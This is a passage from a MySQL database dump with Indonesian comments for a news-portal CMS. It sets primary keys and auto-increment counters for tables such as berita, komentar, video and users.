ALTER TABLE `mod_alamat`
  ADD PRIMARY KEY (`id_alamat`);

--
-- Indeks untuk tabel `mod_ym`
--
ALTER TABLE `mod_ym`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `pasangiklan`
--
ALTER TABLE `pasangiklan`
  ADD PRIMARY KEY (`id_pasangiklan`);

--
-- Indeks untuk tabel `playlist`
--
ALTER TABLE `playlist`
  ADD PRIMARY KEY (`id_playlist`);

--
-- Indeks untuk tabel `poling`
--
ALTER TABLE `poling`
  ADD PRIMARY KEY (`id_poling`);

--
-- Indeks untuk tabel `sekilasinfo`
--
ALTER TABLE `sekilasinfo`
  ADD PRIMARY KEY (`id_sekilas`);

--
-- Indeks untuk tabel `tag`
--
ALTER TABLE `tag`
  ADD PRIMARY KEY (`id_tag`);

--
-- Indeks untuk tabel `tagvid`
--
ALTER TABLE `tagvid`
  ADD PRIMARY KEY (`id_tag`);

--
-- Indeks untuk tabel `tbl_comment`
--
ALTER TABLE `tbl_comment`
  ADD PRIMARY KEY (`id_komentar`);

--
-- Indeks untuk tabel `templates`
--
ALTER TABLE `templates`
  ADD PRIMARY KEY (`id_templates`);

--
-- Indeks untuk tabel `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`username`);

--
-- Indeks untuk tabel `users_modul`
--
ALTER TABLE `users_modul`
  ADD PRIMARY KEY (`id_umod`);

--
-- Indeks untuk tabel `video`
--
ALTER TABLE `video`
  ADD PRIMARY KEY (`id_video`);

--
-- AUTO_INCREMENT untuk tabel yang dibuang
--

--
-- AUTO_INCREMENT untuk tabel `agenda`
--
ALTER TABLE `agenda`
  MODIFY `id_agenda` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=70;

--
-- AUTO_INCREMENT untuk tabel `album`
--
ALTER TABLE `album`
  MODIFY `id_album` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=53;

--
-- AUTO_INCREMENT untuk tabel `background`
--
ALTER TABLE `background`
  MODIFY `id_background` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT untuk tabel `banner`
--
ALTER TABLE `banner`
  MODIFY `id_banner` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=24;

--
-- AUTO_INCREMENT untuk tabel `berita`
--
ALTER TABLE `berita`
  MODIFY `id_berita` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=696;

--
-- AUTO_INCREMENT untuk tabel `download`
--
ALTER TABLE `download`
  MODIFY `id_download` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=32;

--
-- AUTO_INCREMENT untuk tabel `gallery`
--
ALTER TABLE `gallery`
  MODIFY `id_gallery` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=261;

--
-- AUTO_INCREMENT untuk tabel `halamanstatis`
--
ALTER TABLE `halamanstatis`
  MODIFY `id_halaman` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=52;

--
-- AUTO_INCREMENT untuk tabel `header`
--
ALTER TABLE `header`
  MODIFY `id_header` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;

--
-- AUTO_INCREMENT untuk tabel `hubungi`
--
ALTER TABLE `hubungi`
  MODIFY `id_hubungi` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=42;

--
-- AUTO_INCREMENT untuk tabel `identitas`
--
ALTER TABLE `identitas`
  MODIFY `id_identitas` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT untuk tabel `iklanatas`
--
ALTER TABLE `iklanatas`
  MODIFY `id_iklanatas` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=40;

--
-- AUTO_INCREMENT untuk tabel `iklantengah`
--
ALTER TABLE `iklantengah`
  MODIFY `id_iklantengah` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=41;

--
-- AUTO_INCREMENT untuk tabel `katajelek`
--
ALTER TABLE `katajelek`
  MODIFY `id_jelek` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT untuk tabel `kategori`
--
ALTER TABLE `kategori`
  MODIFY `id_kategori` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=61;

--
-- AUTO_INCREMENT untuk tabel `komentar`
--
ALTER TABLE `komentar`
  MODIFY `id_komentar` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=165;

--
-- AUTO_INCREMENT untuk tabel `komentarvid`
--
ALTER TABLE `komentarvid`
  MODIFY `id_komentar` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=117;

--
-- AUTO_INCREMENT untuk tabel `logo`
--
ALTER TABLE `logo`
  MODIFY `id_logo` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT untuk tabel `menu`
--
ALTER TABLE `menu`
  MODIFY `id_menu` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=190;

--
-- AUTO_INCREMENT untuk tabel `modul`
--
ALTER TABLE `modul`
  MODIFY `id_modul` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=76;

--
-- AUTO_INCREMENT untuk tabel `mod_alamat`
--
ALTER TABLE `mod_alamat`
  MODIFY `id_alamat` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT untuk tabel `mod_ym`
--
ALTER TABLE `mod_ym`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT untuk tabel `pasangiklan`
--
ALTER TABLE `pasangiklan`
  MODIFY `id_pasangiklan` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;

--
-- AUTO_INCREMENT untuk tabel `playlist`
--
ALTER TABLE `playlist`
  MODIFY `id_playlist` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=62;

--
-- AUTO_INCREMENT untuk tabel `poling`
--
ALTER TABLE `poling`
  MODIFY `id_poling` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=38;

--
-- AUTO_INCREMENT untuk tabel `sekilasinfo`
--
ALTER TABLE `sekilasinfo`
  MODIFY `id_sekilas` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

--
-- AUTO_INCREMENT untuk tabel `tag`
--
ALTER TABLE `tag`
  MODIFY `id_tag` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=55;

--
-- AUTO_INCREMENT untuk tabel `tagvid`
--
ALTER TABLE `tagvid`
  MODIFY `id_tag` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;

--
-- AUTO_INCREMENT untuk tabel `tbl_comment`
--
ALTER TABLE `tbl_comment`
  MODIFY `id_komentar` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=32;

--
-- AUTO_INCREMENT untuk tabel `templates`
--
ALTER TABLE `templates`
  MODIFY `id_templates` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;

--
-- AUTO_INCREMENT untuk tabel `users_modul`
--
ALTER TABLE `users_modul`
  MODIFY `id_umod` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- AUTO_INCREMENT untuk tabel `video`
--
ALTER TABLE `video`
  MODIFY `id_video` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=175;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
